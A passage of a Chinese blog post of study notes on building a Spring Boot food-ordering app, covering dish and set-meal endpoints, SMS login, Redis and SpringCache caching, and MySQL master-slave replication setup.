/>Controller位置：<code>com.xyy.controller.DishController (updateDish)</code><br />Service位置：<code>com.xyy.service.DishService</code><br />ServiceImpl位置：<code>com.xyy.service.impl.DishServiceImpl</code></p><h3 id="更新实现"><a class="markdownIt-Anchor" href="#更新实现"></a> 更新实现</h3><p>实际上就是两个表联动更新和删除操作，所以MP直接操作是不可以的，所以要在Service层自己再封装一个删除方法，给Controller层调用删除就行<br />对于Dish对象可以直接进行更新，因为DishDto是Dish的子类<br />因此可以调用DishService的update方法传入DishDto对象，来实现Dish的更新<br />Controller位置：<code>com.xyy.controller.DishController (updateDish)</code><br />确实和上面那个一样，因为请求方式不一样<br />Service位置：<code>com.xyy.service.DishService</code><br />ServiceImpl位置：<code>com.xyy.service.impl.DishServiceImpl (updateDishWithFlavor)</code></p><h3 id="其他功能"><a class="markdownIt-Anchor" href="#其他功能"></a> 其他功能</h3><p>完成一些小功能的开发<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b4b59c021748427c87fa6edc48619920.png" alt="在这里插入图片描述" /></p><h4 id="停售功能"><a class="markdownIt-Anchor" href="#停售功能"></a> 停售功能</h4><p>就是把数据库的status值更新一下，两个路径，一个启售，一个停售<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f1da740301ed403399148b6d9afb31f5.png" alt="在这里插入图片描述" /><br />停售请求路径<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2969987e765b4a8e8b4fd71b772bcfa0.png" alt="在这里插入图片描述" /><br />如果状态不一样了，会从停售变成启售，同时对应的请求路径也不一样<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/335331ee558541e089128ff2b36faa6e.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f3b5006617a144c2a50cf48e91daf7db.png" alt="在这里插入图片描述" /><br />Controller位置：<code>com.xyy.controller.DishController (updateStatusStop)</code>停止<br />Controller位置：<code>com.xyy.controller.DishController (updateStatusStart)</code>启动</p><h4 id="删除功能"><a class="markdownIt-Anchor" href="#删除功能"></a> 删除功能</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2e291e2e9a5941dbafb90caed4c894a2.png" alt="在这里插入图片描述" /><br />菜品删除功能<br />完成逻辑删除，不是真删<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2b84f5bc3cd54e1997a87f5768f0b48a.png" alt="在这里插入图片描述" /><br />位置：<br />Controller位置：<code>com.xyy.controller.DishController (deleteDish)</code>停止</p><h1 id="套餐页面"><a class="markdownIt-Anchor" href="#套餐页面"></a> 套餐页面</h1><p>实际上就是一组菜品的集合</p><h2 id="新增套餐概述"><a class="markdownIt-Anchor" href="#新增套餐概述"></a> 新增套餐概述</h2><p>涉及到的数据库<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/490ee26fc870424092c6f06b3b637de2.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6ab0bc680c2d40d48da71becdf139330.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/458f7e16da474362ad0f5b49656bdc06.png" alt="在这里插入图片描述" /><br />导入SetmealDto<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/9f5bd7dfcecc4c5a95d3ce1a48358980.png" alt="在这里插入图片描述" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0bb88c91dfba4c759e8cca3eb574682e.png" alt="在这里插入图片描述" /></p><h2 id="新增套餐之菜品列表"><a class="markdownIt-Anchor" href="#新增套餐之菜品列表"></a> 新增套餐之菜品列表</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7b242922f194454cbce663c939c19fe8.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd6a01bbfbee43a1b7ff6b420815ef7f.png" alt="在这里插入图片描述" /><br />Controller位置：<code>com.xyy.controller.DishController (listCategory)</code></p><h2 id="新增套餐实现"><a class="markdownIt-Anchor" href="#新增套餐实现"></a> 新增套餐实现</h2><p>和新增菜品差不多，这里也是多表的操作<br />Controller位置：<code>com.xyy.controller.SetmealController (saveSetmeal)</code><br />Service位置：<code>com.xyy.service.SetmealService</code><br />ServiceImpl位置：<code>com.xyy.service.impl.SetmealServiceImpl(saveWithDish)</code></p><h2 id="套餐分页"><a class="markdownIt-Anchor" href="#套餐分页"></a> 套餐分页</h2><p>这里的套餐分页和以往不同，设计到了多表内容<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/28b34889b2e4467c9e3e4a79aa3d2d18.png" alt="在这里插入图片描述" /><br />套餐分页Controller位置：<code>com.xyy.controller.SetmealController.pageList</code><br />套餐Mapper接口位置：<code>com.xyy.mapper.SetmealMapper</code><br />Mapper文件位置：<code>resource.mapper.SetmealMapper</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a02a17ef6b8648a59e2b90ef9ec70a3f.png" alt="在这里插入图片描述" /></p><h2 id="更新套餐"><a class="markdownIt-Anchor" href="#更新套餐"></a> 更新套餐</h2><p>添加套餐和更新套餐是几乎完全一致的，字段巴拉巴拉的都一样<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5bf7c40f7b9147b7a093da18ae860952.png" alt="在这里插入图片描述" /><br />但是注意，修改套餐的话，需要先对菜品页面进行填充，这一页都是需要填充满要修改的菜品信息的。<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/07c01da9636d4643acea8689f2579f82.png" alt="在这里插入图片描述" /><br />先发请求，一看就是Restful风格请求<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cb797ab490434dd2ad5de3e282e3f4c4.png" alt="在这里插入图片描述" /><br />获取套餐Controller位置：<code>com.xyy.controller.SetmealController.getSetmal</code></p><h2 id="更新销售状态"><a class="markdownIt-Anchor" href="#更新销售状态"></a> 更新销售状态</h2><p><img src="https://img-blog.csdnimg.cn/53db02cdb6fd4574b2471bdaf7825d78.png" alt="在这里插入图片描述" /><br /><img src="https://img-blog.csdnimg.cn/f2158ec7d2924b2eb17e2ef7b92fc6f3.png" alt="在这里插入图片描述" /><br />和之前一个业务逻辑很像，不想多赘述了，直接放接口位置<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb10511b3fd14b398095865065700680.png" alt="在这里插入图片描述" /></p><p>Controller位置：<code>com.xyy.controller.SetmealController (startSale/stopSale)</code></p><h2 id="删除套餐"><a class="markdownIt-Anchor" href="#删除套餐"></a> 删除套餐</h2><p>可以单独删，也可以批量删，接口是万金油，都能接，主要看传来的数据是几个<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/734b880bdf304e70bb9376ecebcd3d15.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/730459957d464af3827df49084205353.png" alt="在这里插入图片描述" /><br />接口<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/678ea2f5eb194625a05567061bba5ad0.png" alt="在这里插入图片描述" /><br />== 多表删除，在Controller直接实现不太现实，所以要在Service把业务写好==<br />Controller位置：<code>com.xyy.controller.SetmealController (deleteSetmeal)</code><br />Service位置：<code>com.xyy.service.SetmealService</code><br />ServiceImpl位置：<code>com.xyy.service.impl.SetmealServiceImpl(removeWithDish)</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb4351bafe314861b6c775620f39641e.png" alt="在这里插入图片描述" /></p><h1 id="前台开发手机端"><a class="markdownIt-Anchor" href="#前台开发手机端"></a> 前台开发（手机端）</h1><h1 id="账户登陆"><a class="markdownIt-Anchor" href="#账户登陆"></a> 账户登陆</h1><h2 id="短信发送"><a class="markdownIt-Anchor" href="#短信发送"></a> 短信发送</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6db71e2024264927a59a3ae59bca5890.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/56cadd94e4de4536aec20ff921842039.png" alt="在这里插入图片描述" /><br /><a href="https://blog.csdn.net/qq_55106682/article/details/121920826">阿里云短信业务教程</a></p><h3 id="代码实现"><a class="markdownIt-Anchor" href="#代码实现"></a> 代码实现</h3><p><a href="https://help.aliyun.com/document_detail/112148.html">官方文档地址</a><br />导入Maven</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aliyun-java-sdk-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aliyun-java-sdk-dysmsapi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ca8d01eaf61a485a9e0edae0c0307c3a.png" alt="在这里插入图片描述" /><br />导入短信登陆的工具类，把ACCESSKeyID和Secret更换到位就行<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fab29b651545452b8aaf515717a3244d.png" alt="在这里插入图片描述" /></p><h2 id="验证码发送"><a class="markdownIt-Anchor" href="#验证码发送"></a> 验证码发送</h2><p>数据模型user表，手机验证码专用的表<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/582420e32f9449699765ad9db8f665bc.png" alt="在这里插入图片描述" /><br />开发流程<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/03e0ad86bbda4229b8985e6644e2e5f7.png" alt="在这里插入图片描述" /><br />修改拦截器，放行操作<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c136ec0905248328f25be7e137b2da0.png" alt="在这里插入图片描述" /><br /><img src="https://img-blog.csdnimg.cn/15b21dad09be44bfa030984f5f4c1731.png" alt="在这里插入图片描述" /><br />controller位置：<code>com.xyy.controller.UserController （sendMsg）</code><br />发送完还需要验证，验证就是另一个login了</p><h2 id="用户登陆"><a class="markdownIt-Anchor" href="#用户登陆"></a> 用户登陆</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/16f3f2b8f68948b0b4f2e01133adc6ce.png" alt="在这里插入图片描述" /><br />controller位置：<code>com.xyy.controller.UserController （login）</code><br />这里登陆还涉及到过滤器放行的功能，不要忘记了，把用户id存入session，过滤器会进行验证<br />过滤器<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/16d1b1cf6fa54b408d9b5bcd495962f5.png" alt="在这里插入图片描述" /><br />controller<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7da50768c0b043f3a9a5f3dbce6915c1.png" alt="在这里插入图片描述" /></p><h1 id="前台页面"><a class="markdownIt-Anchor" href="#前台页面"></a> 前台页面</h1><h2 id="导入用户地址簿"><a class="markdownIt-Anchor" href="#导入用户地址簿"></a> 导入用户地址簿</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/732d6d4d8bba4911b903055d7a2003cf.png" alt="在这里插入图片描述" /><br />地址表<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e45d3cd4c91e4619a21a3342d4683508.png" alt="在这里插入图片描述" /><br />这里直接导入现成的AddressBookController，没有自己写</p><p>​    com.xyy.controller.AddressBookController</p><h2 id="菜品展示"><a class="markdownIt-Anchor" href="#菜品展示"></a> 菜品展示</h2><p>逻辑梳理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/db2983fb1a8a46bc85f4836dae41a24c.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c7e3567ea3f94b718e33ba680e573121.png" alt="在这里插入图片描述" /><br />修改DishController的list方法，来符合前台请求的要求<br />controller位置：<code>com.xyy.controller.DishController （listCategory）</code><br />套餐内菜品Controller：<code>com.xyy.controller.SetmealController （list）</code></p><h2 id="购物车"><a class="markdownIt-Anchor" href="#购物车"></a> 购物车</h2><p>把菜品加入购物车<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/159ef74addd64f60bfa9d9a44bf22d64.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3b7b1d5d90d949cb94c6c4f77a2f9d96.png" alt="在这里插入图片描述" /><br />逻辑梳理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/48b1358d65a8418689ada067bc6fbdd2.png" alt="在这里插入图片描述" /><br />注意，这里不需要后端去管总价的计算，就是单价*数量的这个操作，不是后端的内容。前端在展示的时候自己就计算了。<br />位置：<code>com.xyy.controller.ShoppingCartController （add）</code></p><h2 id="下单"><a class="markdownIt-Anchor" href="#下单"></a> 下单</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/37b2f6bb4b2e4d82942e38ceea4bbc78.png" alt="在这里插入图片描述" /><br />对应的两个表，一个是orders表，另一个是orders_detail表</p><p>orders表<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/37f1f4d9aec2474ab3578ad01062abf9.png" alt="在这里插入图片描述" /><br />orders_detail表<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d07d325b341841e787117d1f12d727e0.png" alt="在这里插入图片描述" /><br />交互流程<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/04bfdd8093cb41f7956332bb1561e12f.png" alt="在这里插入图片描述" /><br />业务比较复杂，在Service里写的<code>com.xyy.service.impl.OrdersServiceImpl</code></p><p>至此基础部分完成，开始对项目性能进行优化</p><h1 id="小知识点总结"><a class="markdownIt-Anchor" href="#小知识点总结"></a> 小知识点总结</h1><h3 id="requestbody的使用"><a class="markdownIt-Anchor" href="#requestbody的使用"></a> @RequestBody的使用</h3><p>只有传来的参数是Json才能用RequestBody接收，如果不是Json的情况（比如那种？key=value&amp;key=value）是不可以用的，会400错误<br /><a href="https://blog.csdn.net/weixin_44062380/article/details/116103642">关于RequestBody何时使用</a></p><h1 id="缓存优化"><a class="markdownIt-Anchor" href="#缓存优化"></a> 缓存优化</h1><p>基于Redis进行缓存优化<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/017c0aab4eb345d68ba9a5a309e78c7a.png" alt="在这里插入图片描述" /></p><h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2><h3 id="redis进行配置"><a class="markdownIt-Anchor" href="#redis进行配置"></a> Redis进行配置</h3><p>加入Pom文件</p>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--导入Redis依赖--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>yml中加入配置<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a737f91d8934469ca405f2acf279272d.png" alt="在这里插入图片描述" /></p><h2 id="短信验证码-登陆优化"><a class="markdownIt-Anchor" href="#短信验证码-登陆优化"></a> 短信验证码、登陆优化</h2><p>给验证码加入有效时间的验证，设置好短信验证码的有效时间<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dd9f7fcb4dd948b380008dd1d769e535.png" alt="在这里插入图片描述" /><br />如果登陆成功，就自动删除缓存中的验证码<br />优化位置：com.xyy.controller.UserController sendMsg和login<br />注入RedisTemplete<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e881a9dc80a740aab43c8bc30f45a91f.png" alt="在这里插入图片描述" /><br />针对验证码进行优化<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/4139a4aebf384f8e958f0587c7fe4acb.png" alt="在这里插入图片描述" /><br />针对登录后进行优化<br />login方法中<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ccc12a60c924407bb8c859aa66b61c38.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/24b7a6e20b7840e1a868dea4be2f0787.png" alt="在这里插入图片描述" /><br />这里过滤器也要改，因为登陆的id数据由session变成了redis存放，所以要把过滤器的相关部分进行改造</p><p>​<br />​    com.xyy.filter.LoginCheckFilter</p><p>同样要先注入RedisTemplate<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb4030b56bd64c6dbdc5633c67e4bbfb.png" alt="在这里插入图片描述" /></p><h2 id="缓存前台菜品数据"><a class="markdownIt-Anchor" href="#缓存前台菜品数据"></a> 缓存前台菜品数据</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/32925b5c084942ecb5f5f9aa153a6d96.png" alt="在这里插入图片描述" /><br />缓存思路，要保证缓存数据库和DBMS内的数据保持同步，避免读到脏数据（没更新的数据）<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ed16b6270e734adaaf78058373894604.png" alt="在这里插入图片描述" /><br />对DishController进行优化，加入了缓存<br />再次访问可以发现，如果已经缓存过了当前的菜品分类，就不会再查数据库了</p><h3 id="更新菜品同时更新缓存"><a class="markdownIt-Anchor" href="#更新菜品同时更新缓存"></a> 更新菜品同时更新缓存</h3><p>保证少出现脏数据，所以加入清理缓存，不及时清理的话，新数据保存上来，列表数据库无法同步更新。就会出现问题。<br />这里清理精确数据。大面积清缓存也是比较费性能的<br />这种就是全清理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/60b7f47bf7d24be0bec55a2309e1f227.png" alt="在这里插入图片描述" /><br />这种是精确清理<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/958c3fd2cb824012af93adfd54d4ea24.png" alt="在这里插入图片描述" /></p><h2 id="springcache"><a class="markdownIt-Anchor" href="#springcache"></a> SpringCache</h2><h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a59b7272acce47e98a6bd7505772e071.png" alt="在这里插入图片描述" /></p><h3 id="springcache常用注解及功能"><a class="markdownIt-Anchor" href="#springcache常用注解及功能"></a> SpringCache常用注解及功能</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/768c769e2725422f88530feca96d70b8.png" alt="在这里插入图片描述" /></p><h3 id="快速起步"><a class="markdownIt-Anchor" href="#快速起步"></a> 快速起步</h3><p>启动类上要加入<code>@EnableCaching</code>注解，启用缓存框架<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d29b058bff0d4269aa35202a9e35143d.png" alt="在这里插入图片描述" /></p><h4 id="cacheput注解"><a class="markdownIt-Anchor" href="#cacheput注解"></a> @CachePut注解</h4><p>缓存方法返回值，缓存一条或者多条数据<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0d18d4dcaad54cc7814e3fa1a82ed8c8.png" alt="在这里插入图片描述" /></p><h4 id="cacheevict注解"><a class="markdownIt-Anchor" href="#cacheevict注解"></a> @CacheEvict注解</h4><p>删除缓存<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ae87712409804775b614bebb226e8896.png" alt="在这里插入图片描述" /></p><h4 id="cacheable注解"><a class="markdownIt-Anchor" href="#cacheable注解"></a> @Cacheable注解</h4><p>先看看Spring是否已经缓存了当前数据，如果已经缓存那么直接返回。<br />如果没有缓存就直接缓存到内存里<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c2e3aa34ea3442d894543d105ebb9b41.png" alt="在这里插入图片描述" /><br />一些特殊情况，condition属性和Unless属性<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ec27f124b8c047e08a8b95af613ed922.png" alt="在这里插入图片描述" /></p><p>前面都是用SpringCache自带的缓存容器，性能肯定比不了Redis<br />所以现在开始引入Redis作为SpringCache缓存的产品<br />切换为Redis作为缓存产品</p><h4 id="springcache-redis"><a class="markdownIt-Anchor" href="#springcache-redis"></a> SpringCache-Redis</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8dae4993b8494af598d870917e46ba56.png" alt="在这里插入图片描述" /><br />导入jar包<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/afdfe6133e254348a03303db222f1762.png" alt="在这里插入图片描述" /><br />注入相对应的缓存产品Manager就可以了，这里以RedisManager为例<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/69344c2b79044bb7a354d96cb148d495.png" alt="在这里插入图片描述" /></p><h2 id="利用springcache-redis来缓存套餐数据"><a class="markdownIt-Anchor" href="#利用springcache-redis来缓存套餐数据"></a> 利用SpringCache-Redis来缓存套餐数据</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ffd8677c072d4697971562d1a96134bc.png" alt="在这里插入图片描述" /><br />启动类上要加入<code>@EnableCaching</code>注解，启用缓存框架<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d29b058bff0d4269aa35202a9e35143d.png" alt="在这里插入图片描述" /><br />加入注解时的坑<br />这里相当于是从Return中拿到Setmeal中的属性，但是Return时的数据是Result封装的Setmeal数据，显然无法完成序列化，这里也是需要对Result类进行序列化的改造<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f1309a8146514e37bb8078ef9b0cc7ca.png" alt="在这里插入图片描述" /><br />继承序列化类，使其可以序列化<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f25595d9069441d1adf22a469e842c09.png" alt="在这里插入图片描述" /><br />=此时就完成了缓存的优化，此时如果缓存中有当前value名字的缓存，就自动返回，如果没有就查询一下。当前缓存自动过期的时间在yml里面有详细配置</p><p>保存套餐方法缓存优化<br />一保存套餐，对应的缓存就得删除，因为数据更新了要重新获取<br />还有更新套餐，理由同上<br />删除方法要加<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0896df7570f843a19afb69975c4a328f.png" alt="在这里插入图片描述" /><br />保存方法也要加<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3206a5c50388428ea4809425d083bc72.png" alt="在这里插入图片描述" /></p><h1 id="数据库优化"><a class="markdownIt-Anchor" href="#数据库优化"></a> 数据库优化</h1><h2 id="mysql读写分离"><a class="markdownIt-Anchor" href="#mysql读写分离"></a> MySQL读写分离</h2><p>将单点数据库改成分布式的数据库服务器<br />主写从读。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/95b2e61b3c594adeac1732bcc6d719d6.png" alt="在这里插入图片描述" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/be32928754c8409785c39f857ee78381.png" alt="在这里插入图片描述" /></p><h2 id="mysql主从复制搭建"><a class="markdownIt-Anchor" href="#mysql主从复制搭建"></a> MySQL主从复制搭建</h2><h3 id="主库设置"><a class="markdownIt-Anchor" href="#主库设置"></a> 主库设置</h3><p>主从复制架构图<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c72d940c5ff143ea834e53e05fb4db83.png" alt="在这里插入图片描述" /><br />以上就可以做到主库数据和从库数据保持同步</p><p>对主库进行配置<br />Linux改法<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/71faca81d5524f7f81249639ec421334.png" alt="在这里插入图片描述" /></p><p>​    log-bin=mysql-bin #启动二进制<br />​    server-id=100 #唯一id</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/07f64dd342a54a02bb9db8055535c02d.png" alt="在这里插入图片描述" /></p><p>windows改法</p><p>在mysql安装路径下<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ddcf86e4bfc344c3874a528909018c4d.png" alt="在这里插入图片描述" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d85b28a9fe5c4fdebb9bef5d96717860.png" alt="在这里插入图片描述" /></p><p>修改好了重启MySQL</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/841a999f27fe4910baf41c7ba6728ad7.png" alt="在这里插入图片描述" /><br />windows版本的重启教程在这里<br /><a href="https://blog.csdn.net/weixin_31444279/article/details/113223859">重启mysql</a></p><p>=======================================================</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/06539e930d864f08831019eed03e50c0.png" alt="在这里插入图片描述" /></p><p>​<br />​    GRANT REPLICATION SLAVE ON*.*to’xiaoming’@’%'identified by ‘Root@123456’;</p><p>这里我把本地的MySQL作为主机，把阿里云作为从机<br />运行一下权限SQL<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bbbc91e5cd674f60a0e3765c1e3a477b.png" alt="在这里插入图片描述" /></p><p>查看主机状态<code>show master status;</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c46f23083eb4d009cee681610f20467.png" alt="在这里插入图片描述" /></p><h3 id="从库设置"><a class="markdownIt-Anchor" href="#从库设置"></a> 从库设置</h3><p>从库这里选择了阿里云<br />还是先修改配置文件，加入端口id<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/59c47eb35c4748948c96ac6bf1a0eb17.png" alt="在这里插入图片描述" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b8ac44ce50c546b5bfeb507a0ab7ef4f.png" alt="在这里插入图片描述" /><br />第二步还是从库重启（Linux中）<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5f1f8347417441ccb00d15c08ff5cb5a.png" alt="在这里插入图片描述" /><br />第三部，设置连接到主机<br />运行SQL<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dda57b14af0845aca9056e4788a34fea.png" alt="在这里插入图片描述" /></p><p>运行一下<br />具体的可以去从机用show master status查看</p><p>​<br />​    change master to master_host=‘ip’,master_user=‘xiaoming’,master_password=‘Root@123456’,master_log_file=‘mysql-bin.eo0001’,master_log_pos=主机的position</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1f88d8237d804843849777aa1c3e0f4e.png" alt="在这里插入图片描述" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e9080c8d03a24206a4a00b553b1c9ade.png" alt="在这里插入图片描述" /><br />这里我是两台服务器，一台docker安装的mysql（从机）<br />另一台是普通安装的mysql做主机，配置过程中遇到了很多问题，参考了下面的链接<br /><a href="https://blog.csdn.net/xizhen2791/article/details/123660049">参考教程</a></p><p>一定一定记着上面从机连接命令运行成功后要启动从机也就是</p><p>​<br />​    slave start</p><p>最后运行<code>start slave</code>就算是执行成功了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cf6e9e14501149a197b7a6cc329cc1d0.png" alt="在这里插入图片描述" /><br />查看一下从机状态</p><p>​<br />​    show slave status</p><p>这样就算搭建好了<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/54747e8178044d8c9f68a7ecf1862bb7.png" alt="在这里插入图片描述" /></p><h3 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h3><p><img 